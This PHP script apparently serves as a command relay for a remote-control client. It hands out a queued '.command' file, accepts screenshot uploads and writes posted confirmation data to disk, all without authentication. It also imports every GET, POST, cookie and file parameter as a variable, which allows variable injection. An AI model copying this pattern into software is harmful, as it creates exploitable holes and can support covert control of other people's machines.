<?php

include("functions.php");

foreach ($_GET as $key => $val) $$key=$val;
foreach ($_POST as $key => $val) $$key=$val;
foreach ($_COOKIE as $key => $val) $$key=$val;
foreach ($_FILES as $key => $val) $$key=$val;

$config['client']['root'] = str_replace("\\", "/", getcwd());
$config['client']['pathfile']['confirm'] = $config['client']['root'] . "/" . ".confirm";
$config['client']['file']['screenshot'] = $config['client']['root']. "/". "screenshot.jpg";

if($server_action == "request"){
	if(file_exists(".command")){
		//read then delete file command 
		$command = file_get_contents(".command");
		unlink(".command");
		print $command;
	}
}

if($server_action == "confirm"){
	
	// cek input type file first
	if(isset($server_screenshot)){		
		$confirm[$server_action]['server_screenshot'] = move_uploaded_file($server_screenshot['tmp_name'], $config['client']['file']['screenshot']) ? true : false;
		print serialize($confirm);
	}
	
	// input type text
	// $server_data
	
	//create file confirm
	
	create_file($config['client']['pathfile']['confirm'],"w",$server_data);
	
	
}

?>